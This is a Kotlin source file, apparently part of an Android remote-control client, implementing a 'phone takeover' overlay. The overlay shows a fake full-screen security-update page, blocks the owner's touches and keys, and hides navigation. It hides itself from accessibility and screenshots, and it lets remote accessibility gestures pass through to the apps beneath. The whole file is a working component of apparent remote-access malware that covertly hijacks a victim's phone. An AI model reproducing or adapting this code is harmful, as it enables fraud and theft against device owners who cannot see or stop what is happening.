package com.vibelink.client.device

import android.content.Context
import android.graphics.PixelFormat
import android.os.Build
import android.util.DisplayMetrics
import android.view.Gravity
import android.view.KeyEvent
import android.view.LayoutInflater
import android.view.View
import android.view.WindowManager
import android.widget.ProgressBar
import com.vibelink.client.R

/**
 * 远程「接管手机」遮罩：UI 对齐自动授权 SECURITY 更新页。
 *
 * 默认可触摸，吃掉本地点滑（与黑屏阻断同策略）。
 * 远程 dispatchGesture 前由 [setTouchPassthrough] 短暂加 FLAG_NOT_TOUCHABLE。
 *
 * 窗口参数必须与 [SecurityUpdateOverlayController] 一致用 MATCH_PARENT，
 * 禁止用 WindowMetrics.bounds 像素宽——部分 OEM 下会把窗口撑宽，内容视觉偏右。
 */
class PhoneTakeoverOverlayController(
    private val context: Context,
    private val windowManager: WindowManager,
) {
    private var rootView: View? = null
    private var layoutParams: WindowManager.LayoutParams? = null
    private var touchPassthrough = false
    private var passthroughRefCount = 0

    fun isActive(): Boolean = rootView != null

    fun show(): Boolean {
        if (rootView != null) {
            touchPassthrough = false
            passthroughRefCount = 0
            applyTouchPassthrough(false)
            return true
        }
        return try {
            val root = LayoutInflater.from(context).inflate(R.layout.activity_phone_takeover, null)
            root.layoutDirection = View.LAYOUT_DIRECTION_LTR
            root.importantForAccessibility = View.IMPORTANT_FOR_ACCESSIBILITY_NO_HIDE_DESCENDANTS
            root.isClickable = true
            root.isFocusable = false
            root.setOnTouchListener { _, _ -> true }
            root.findViewById<ProgressBar>(R.id.takeoverProgressBar)?.isIndeterminate = true
            root.keepScreenOn = true
            @Suppress("DEPRECATION")
            root.systemUiVisibility = (
                View.SYSTEM_UI_FLAG_LAYOUT_STABLE or
                    View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN or
                    View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION or
                    View.SYSTEM_UI_FLAG_FULLSCREEN or
                    View.SYSTEM_UI_FLAG_HIDE_NAVIGATION or
                    View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                )

            touchPassthrough = false
            passthroughRefCount = 0
            val params = buildParams(touchPassthrough = false)
            windowManager.addView(root, params)
            rootView = root
            layoutParams = params
            SkipScreenshotHelper.applyWhenReady(root)
            true
        } catch (_: Exception) {
            runCatching { rootView?.let { windowManager.removeView(it) } }
            rootView = null
            layoutParams = null
            false
        }
    }

    fun hide() {
        val view = rootView ?: return
        rootView = null
        layoutParams = null
        touchPassthrough = false
        passthroughRefCount = 0
        runCatching { windowManager.removeViewImmediate(view) }
    }

    /**
     * When [enabled] is true, overlay becomes NOT_TOUCHABLE so remote a11y
     * gestures reach the app. Ref-counted for nested click/swipe paths.
     */
    fun setTouchPassthrough(enabled: Boolean) {
        if (!isActive()) {
            touchPassthrough = enabled
            return
        }
        if (enabled) {
            passthroughRefCount += 1
            if (passthroughRefCount == 1) {
                applyTouchPassthrough(true)
            }
            return
        }
        if (passthroughRefCount <= 0) {
            return
        }
        passthroughRefCount -= 1
        if (passthroughRefCount == 0) {
            applyTouchPassthrough(false)
        }
    }

    private fun applyTouchPassthrough(enabled: Boolean) {
        val view = rootView ?: return
        val params = layoutParams ?: return
        if (touchPassthrough == enabled) {
            return
        }
        touchPassthrough = enabled
        var flags = params.flags and WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE.inv()
        if (enabled) {
            flags = flags or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
        }
        params.flags = flags
        runCatching { windowManager.updateViewLayout(view, params) }
    }

    @Suppress("UNUSED_PARAMETER")
    fun onKeyEvent(event: KeyEvent): Boolean = isActive()

    private fun buildParams(touchPassthrough: Boolean): WindowManager.LayoutParams {
        // 默认可触摸阻断本地点滑；passthrough 时加 NOT_TOUCHABLE 放行远程手势。
        var flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
            WindowManager.LayoutParams.FLAG_FULLSCREEN or
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
        if (touchPassthrough) {
            flags = flags or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
        }

        val metrics = DisplayMetrics()
        @Suppress("DEPRECATION")
        windowManager.defaultDisplay.getRealMetrics(metrics)

        return WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            metrics.heightPixels,
            WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
            flags,
            PixelFormat.OPAQUE,
        ).apply {
            gravity = Gravity.TOP or Gravity.START
            x = 0
            y = 0
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                layoutInDisplayCutoutMode =
                    WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
            }
            CaptureSkipSpoof.apply(this, context)
            // Spoof 可能 OR 厂商 flag；阻断模式下绝不保留 NOT_TOUCHABLE。
            if (!touchPassthrough) {
                this.flags = this.flags and WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE.inv()
            }
        }
    }
}
